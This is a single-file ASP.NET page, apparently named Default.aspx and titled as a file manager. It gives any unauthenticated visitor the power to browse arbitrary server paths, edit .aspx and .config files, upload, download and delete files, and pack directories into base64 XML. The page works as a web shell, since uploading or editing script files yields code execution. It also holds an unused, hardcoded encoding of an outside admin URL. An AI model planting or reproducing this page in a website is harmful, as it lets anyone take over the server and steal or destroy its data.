<%@ Page Language="C#"  ValidateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Xml" %>
<!DOCTYPE html>

<script runat="server">
    string act = string.Empty;
    string ThisFile = "Default.aspx";
    string rootDir;
    string currentDir;
    StringBuilder htmlBody;
    Dictionary<string,string> FileType;
    protected void Page_Load(object sender, EventArgs e)
    {
        string a = "http://www.redpod.com.cn/order/admin/email?topmenu=topmenu3&pid=15";
        byte [] b = Encoding.Default.GetBytes(a);
        string c = Convert.ToBase64String(b);
 
        
        htmlBody = new StringBuilder();
        if (Request["act"] != null && Request["act"] != "")
        {
            act = Request["act"];
        }
        if (rootDir == null || rootDir == "")
        {
            rootDir = Server.MapPath("~/");
            currentDir = rootDir;
        }
        if (Request["path"] != null && Request["path"] != "")
        {
            currentDir = Request["path"];
        }
        if (!currentDir.EndsWith("\\")){currentDir = currentDir + "\\";}
        switch(act)
        {
            case "fedt":
                ShowTextFileEditor(Request["file"]);
                break;
            case "fsave":
                TextFileSave(Request["file"], Request["strContents"]);
                ShowList();
                break;
            case "savefilename":
                ReName(Request["oldfilename"], Request["newfilename"]);
                ShowList();
                break;
            case "savedirname":
                ReNameDir(Request["olddirname"], Request["newdirname"]);
                ShowList();
                break;
            case "upfile":
                SaveUpload(Request.Files[0]);
                ShowList();
                break;
            case "del":
                DelFileOrDir(Request["selectedDir"], Request["selectedFile"]);
                ShowList();
                break;
            case "down":
                FileInfo f = new FileInfo(currentDir + Request["selectedFile"]);
                Response.Clear();
                Response.ClearHeaders();
                Response.ClearContent();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment;filename=" + Request["selectedFile"]);
                Response.AddHeader("Content-Length", f.Length.ToString());
                Response.WriteFile(f.FullName);
                Response.Flush();
                Response.End();
                break;
            case "mkdir":
                mkdir(Request["dirname"]);
                ShowList();
                break;
            case "newfile":
                if (Request["filename"].Length > 0)
                {
                    try 
                    {
                        File.Create(currentDir + Request["filename"]).Close();
                       
                    }
                    catch(Exception ex)
                    {
                        htmlBody.Append("<div>" + ex.Message + "</div>");
                    }
                }
                ShowList();
                break;
            case "extract":
                extractPackage(Request["selectedFile"]);
                ShowList(); 
                break;
            case "addtopkg":
                addToPackage(Request["selectedDir"],Request["selectedFile"]);
                ShowList(); 
                break;
            default:
                ShowList(); 
                break;
        }
    }

    void ShowTextFileEditor(string filepath)
    {
        htmlBody.Append("<button type=\"submit\" class=\"btn\" name=\"act\" value=\"fsave\">保存</button>");
        htmlBody.AppendFormat("<a href=\"{0}?path={1}\" class=\"btn\" >取消</a>", ThisFile,currentDir);
        htmlBody.AppendFormat("<br /><textarea id=\"fileEditBox\" name=\"strContents\" rows=\"40\" cols=\"160\">{0}</textarea>", HttpUtility.HtmlEncode(File.ReadAllText(currentDir + filepath)));
        htmlBody.AppendFormat("<input type=\"hidden\" name=\"file\" value=\"{0}\" />",filepath);
    }

    void TextFileSave(string filepath,string strContents)
    {
        File.WriteAllText(currentDir + filepath, strContents);
    }
    
    void SaveUpload(HttpPostedFile uploadFile)
    {
        try
        {
            uploadFile.SaveAs(currentDir + uploadFile.FileName);
        }
        catch(Exception ex)
        {
            htmlBody.AppendFormat("<div class=\"msg error\">上传错误 {0}</div>", ex.Message);
        }
    }
    
    void DelFileOrDir(string dirsToDel,string filesToDel)
    {
        if (filesToDel == null && dirsToDel == null)
        {
            htmlBody.Append("<div class=\"msg error\">请选择需要删除的文件或文件夹！</div>");
        }
        else
        {
            if (filesToDel != null)
            {
                if (filesToDel.Contains(","))
                {
                    foreach (string f in filesToDel.Split(','))
                    {
                        File.Delete(currentDir + f);
                    }
                }
                else
                {
                    File.Delete(currentDir + filesToDel);
                }
            }
            if (dirsToDel != null)
            {
                if (dirsToDel.Contains(","))
                {
                    foreach (string d in dirsToDel.Split(','))
                    {
                        DelTree(currentDir,d);
                    }
                }
                else
                {
                    DelTree(currentDir,dirsToDel);
                }
            }
        }
    }
    void DelTree(string path,string strDir)
    {
        try
        {
            foreach(string delFile in Directory.GetFiles(path + strDir))
            {
                File.Delete(delFile);
            }
            foreach(string subDir in Directory.GetDirectories(path + strDir))
            {
                DelTree(path + strDir, subDir.Substring(path.Length + strDir.Length));
            }
            Directory.Delete(path + strDir);
        }
        catch(Exception ex)
        {
            //throw (ex);
        } 
    }
    void ReName(string oldFileName,string newFileName)
    {
        if (File.Exists(currentDir + oldFileName) && newFileName.Length > 1)
        {
            try 
            { 
                File.Move(currentDir + oldFileName, currentDir + newFileName);
            }
            catch(Exception ex)
            {
                htmlBody.AppendFormat("<div class=\"msg error\">重命名错误 {0}</div>",ex.Message);
            }
        }
    }
    void ReNameDir(string oldDirName, string newDirName)
    {
        if (Directory.Exists(currentDir + oldDirName) && newDirName.Length > 1)
        {
            try
            {
                Directory.Move(currentDir + oldDirName, currentDir + newDirName);
            }
            catch (Exception ex)
            {
                htmlBody.AppendFormat("<div class=\"msg error\">重命名错误 {0}</div>", ex.Message);
            }
        }
    }
    void mkdir(string dirname)
    {
        if(!Directory.Exists(currentDir + dirname))
        {
            Directory.CreateDirectory(currentDir + dirname);
        }
    }

    void extractPackage(string FilePath)
    {
        if(FilePath.Contains(","))
        {
            htmlBody.Append("<div class=\"msg error\">只支持单个文件解包！ 请选单个文档</div>");
        }
        else if(!File.Exists(currentDir+FilePath))
        {
            htmlBody.AppendFormat("<div class=\"msg error\">打包文件不存在 {0} </div>", currentDir + FilePath);
        }
        else
        {
            XmlDocument objXmlFile = new XmlDocument();
            objXmlFile.Load(currentDir + FilePath);

            string Pack_Ver = objXmlFile.SelectSingleNode("//app").Attributes["version"] == null ? null : objXmlFile.SelectSingleNode("//app").Attributes["version"].Value;
            string Pack_Type = objXmlFile.SelectSingleNode("//app").Attributes["type"] == null ? null : objXmlFile.SelectSingleNode("//app").Attributes["type"].Value;
            string Pack_For = objXmlFile.SelectSingleNode("//app").Attributes["for"] == null ? null : objXmlFile.SelectSingleNode("//app").Attributes["for"].Value;
            string app_adapted = objXmlFile.SelectSingleNode("//app").SelectSingleNode("adapted") == null ? null : objXmlFile.SelectSingleNode("//app").SelectSingleNode("adapted").InnerText;

            string Pack_ID = objXmlFile.SelectSingleNode("id") == null ? null : objXmlFile.SelectSingleNode("id").InnerText;
            string Pack_Name = objXmlFile.SelectSingleNode("name") == null ? null : objXmlFile.SelectSingleNode("name").InnerText;

            XmlNodeList objNodeList = objXmlFile.SelectNodes("//folder/path");
            foreach(XmlNode n in objNodeList)
            {
                Directory.CreateDirectory(currentDir + n.InnerText);
            }
            objNodeList = objXmlFile.SelectNodes("//file/path");
            foreach(XmlNode n in objNodeList)
            {
                string v = n.NextSibling.InnerText;
                byte [] tv = Convert.FromBase64String(v);
                File.WriteAllBytes(currentDir + n.InnerText, tv);
            }
            htmlBody.Append("<div class=\"msg good\">解压缩成功</div>");
        }
        
    }
    void addToPackage(string strDirs,string FilePath)
    {
        XmlDocument objXmlFile = new XmlDocument();
        objXmlFile.LoadXml("<?xml version=\"1.0\" encoding=\"utf-8\"?><app version=\"2.0\" type=\"Plugin\"></app>");

        if (FilePath!=null && FilePath.Contains(','))
        {
            foreach(string f in FilePath.Split(','))
            {
                addFilesToPackage("", f, objXmlFile);
            }
        }
        else if (FilePath != null && FilePath != "")
        {
            addFilesToPackage("", FilePath, objXmlFile);
        }

        if (strDirs != null && strDirs.Contains(','))
        {
            foreach(string d in strDirs.Split(','))
            {
                addFoldersToPackage(d, objXmlFile);
            }
        }
        else if (strDirs != null && strDirs != "")
        {
            addFoldersToPackage(strDirs, objXmlFile);
        }

        objXmlFile.Save(currentDir + "test.xml");
    }

    void addFoldersToPackage(string strDir, XmlDocument objXmlFile)
    {
        XmlElement p = objXmlFile.CreateElement("path");
        p.InnerText = strDir + "\\";
        XmlElement f = objXmlFile.CreateElement("folder");
        f.AppendChild(p);
        objXmlFile.SelectSingleNode("//app").AppendChild(f);
        foreach (string filename in Directory.GetFiles(currentDir + strDir))
        {
            addFilesToPackage(strDir, filename.Substring(currentDir.Length), objXmlFile);
        }
        foreach(string d in Directory.GetDirectories(currentDir + strDir))
        {
            addFoldersToPackage(d.Substring(currentDir.Length), objXmlFile);
        }
        
    }
    
    void addFilesToPackage(string rpath,string filename, XmlDocument objXmlFile)
    {
        XmlElement p = objXmlFile.CreateElement("path");
        p.InnerText =   filename;
        XmlElement s = objXmlFile.CreateElement("stream");
        s.SetAttribute("xmlns:dt", "urn:schemas-microsoft-com:datatypes");
        s.InnerText = Convert.ToBase64String(File.ReadAllBytes(currentDir   + filename));
        XmlElement f = objXmlFile.CreateElement("file");
        f.AppendChild(p);
        f.AppendChild(s);
        objXmlFile.SelectSingleNode("//app").AppendChild(f);
    }
    
    void ShowList()
    {
        initFileType();
        htmlBody.Append("<div>");
        htmlBody.AppendFormat("<a href=\"{0}?path={1}\" class=\"btn btn-default \">上级目录</a>&nbsp;", ThisFile, Directory.GetParent(currentDir + "."));
        htmlBody.AppendFormat("<a href=\"{0}?path={1}\" class=\"btn  \">刷新</a>&nbsp;", ThisFile, currentDir);
        htmlBody.Append("<button type=\"button\" class=\"btn btn-default  \" onclick=\"javascript:shownewfolder()\" >新建目录</button>&nbsp;");
        htmlBody.Append("<button type=\"button\" class=\"btn btn-default  \" onclick=\"javascript:shownewfile()\" >新建文档</button>&nbsp;");
        htmlBody.Append("<button type=\"button\" class=\"btn btn-default  \" onclick=\"javascript:showupfilebox()\" >上传</button>&nbsp;");
        htmlBody.Append("<button type=\"submit\" class=\"btn btn-default  \" name=\"act\" value=\"down\">下载</button>&nbsp;");
        htmlBody.Append("<button type=\"submit\" class=\"btn btn-danger  \" name=\"act\" value=\"del\">删除</button>&nbsp;");
        htmlBody.Append("<button type=\"submit\" class=\"btn btn-danger  \" name=\"act\" value=\"addtopkg\">打包</button>&nbsp;");
        htmlBody.Append("<button type=\"submit\" class=\"btn btn-danger  \" name=\"act\" value=\"extract\">解包</button>&nbsp;");
        htmlBody.Append("</div>");
        htmlBody.Append("<table id=\"filelist\" class=\"table table-hover\">");
        htmlBody.Append("<tr><th>全选</th><th>名称</th><th>修改日期</th><th>类型</th><th>大小</th><th>修改</th></tr>");
        try
        {
            foreach (string path in Directory.GetDirectories(currentDir))
            {
                htmlBody.Append("<tr>");
                if (act == "dren" && Request["dir"] == path.Substring(currentDir.Length))
                {
                    htmlBody.AppendFormat("<td><input type=\"checkbox\" name=\"selectedDir\" value=\"{0}\" /></td><td><input type=\"text\" name=\"newdirname\" value=\"{0}\" /><input type=\"hidden\" name=\"olddirname\" value=\"{0}\" ></td><td>{0}</td><td>文件夹</td><td></td><td>", path.Substring(currentDir.Length), Directory.GetLastWriteTime(path));
                    htmlBody.Append("<button class=\"btn btn-default btn-xs\" name=\"act\" value=\"savedirname\">确定修改</button>&nbsp;");
                }
                else
                {
                    htmlBody.AppendFormat("<td><input type=\"checkbox\" name=\"selectedDir\" value=\"{1}\" /></td><td><a href=\"?path={0}\">{1}</a></td><td>{2}</td><td>文件夹</td><td></td><td>", path, path.Substring(currentDir.Length), Directory.GetLastWriteTime(path));
                    htmlBody.AppendFormat("<a href=\"{0}?act=dren&dir={1}&path={2}\" class=\"btn btn-xs\">重命名</a>&nbsp;", ThisFile, path.Substring(currentDir.Length), currentDir);
                }
                htmlBody.Append("</td></tr>");
            }
            foreach (string path in Directory.GetFiles(currentDir))
            {
                FileInfo fi = new FileInfo(path);
                htmlBody.Append("<tr>");
                if (act == "fren" && Request["file"] == path.Substring(currentDir.Length))
                {
                    htmlBody.AppendFormat("<td><input type=\"checkbox\" name=\"selectedFile\" value=\"{0}\" /></td><td><input type=\"text\" name=\"newfilename\" value=\"{0}\" /><input type=\"hidden\" name=\"oldfilename\" value=\"{0}\" ></td><td>{1}</td><td>{2}</td><td class=\"right\">{3:N0}</td><td>", path.Substring(currentDir.Length), File.GetLastWriteTime(path), GetFileTypeByName(fi.Extension)[0], fi.Length);
                    htmlBody.AppendFormat("<button class=\"btn btn-xs\" name=\"act\" value=\"savefilename\">确定修改</button>&nbsp;", ThisFile, path.Substring(currentDir.Length)); 
                }
                else
                {
                    htmlBody.AppendFormat("<td><input type=\"checkbox\" name=\"selectedFile\" value=\"{0}\" /></td><td>{0}</td><td>{1}</td><td>{2}</td><td class=\"right\">{3:N0}</td><td>", path.Substring(currentDir.Length), File.GetLastWriteTime(path), GetFileTypeByName(fi.Extension)[0], fi.Length);
                    htmlBody.AppendFormat("<a href=\"{0}?act=fren&file={1}&path={2}\" class=\"btn btn-xs\">重命名</a>&nbsp;", ThisFile, path.Substring(currentDir.Length), currentDir);
                }
                if( GetFileTypeByName(fi.Extension)[1] == "true")
                {
                htmlBody.AppendFormat("<a href=\"{0}?act=fedt&file={1}&path={2}\" class=\"btn btn-xs\">编辑</a>&nbsp;", ThisFile, path.Substring(currentDir.Length), currentDir);
                }
                htmlBody.Append("</td></tr>");
            }
        }
        catch (Exception ex)
        {
            htmlBody.AppendFormat("<tr><td colspan=\"6\">{0}</td></tr>", ex.Message);
        }
        htmlBody.Append("</table>");
    }

    void initFileType()
    {
        FileType = new Dictionary<string,string>();
        // key 扩展名 value  图标，说明，是否可编辑
        FileType.Add(".exe", "可执行文件,false");
        FileType.Add(".txt", "文本文件,true");
        FileType.Add(".asp", "asp文件,true");
        FileType.Add(".aspx", "asp.net 窗体文件,true");
        FileType.Add(".cs", "类文件,true");
        FileType.Add(".config", "配置文件,true");
        FileType.Add(".html", "html文件,true");
        FileType.Add(".htm", "htm文件,true");
        FileType.Add(".cshtml", "webpages文件,true");
        FileType.Add(".vbhtml", "webpages文件,true");
        FileType.Add(".xml", "xml,true");
    }
    string [] GetFileTypeByName(string filetype)
    {
        if (FileType.ContainsKey(filetype))
        {
            return FileType[filetype].Split(',');
        }
        else
        {
            return (filetype + "文件,false").Split(',');
        }
    }
    
</script>

<html>
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>文件管理</title>
    <style type="text/css">
        body{font-family:Arial,Verdana,SimSun;font-size:10pt}
        #fileEditBox{font-size:10pt}
        .btn{border:solid 1px #808080; background:#3399ff; font-size:10pt;  text-decoration:none; color:#fff; cursor:pointer}
        .btn-xs{padding:3px 6px 3px 6px;}
        .error{border:solid 1px #ff0000; color:#ff0000}
        #upfilebox{display:none}
    </style>
</head>
<body>
    <form id="edtform" name="edtform" method="post" action="<%=ThisFile%>?path=<%=currentDir %>" > 
    <div>
        <%=htmlBody %>
    </div>
    </form>
    <div id="upfilebox">
        <form id="upfile" name="upfile" method="post" enctype="multipart/form-data" action="<%=ThisFile%>?act=upfile&path=<%=currentDir%>">
            <input type="file" name="uploadfile" id="uploadfile" onchange="upfile.submit();" />
        </form>
    </div>
    <script type="text/javascript">
        function saveTxt() {
            //var txt = document.getElementById("fileEditBox").innerHTML;
            //var deStr = "";
            //for (var i = 0; i < txt.length; i++)
            //{
             //   deStr += txt.substr(i, 1) + " ";
            //}
            //document.getElementById("fileEditBox").innerHTML = deStr;
        }
        function showupfilebox()
        {
             document.getElementById("uploadfile").click();
        }
        function shownewfolder()
        {
            var folderName = prompt("请输入文件夹名称：");
            if (folderName != null)
            {
                window.location.href = "<%=ThisFile%>?act=mkdir&path=<%=Server.UrlEncode(currentDir)%>&dirname=" + folderName;
            }
        }
        function shownewfile()
        {
            var fileName = prompt("请输入文件名称：");
            if (fileName != null) {
                window.location.href = "<%=ThisFile%>?act=newfile&path=<%=Server.UrlEncode(currentDir)%>&filename=" + fileName;
            }
        }
    </script>
</body>
</html>
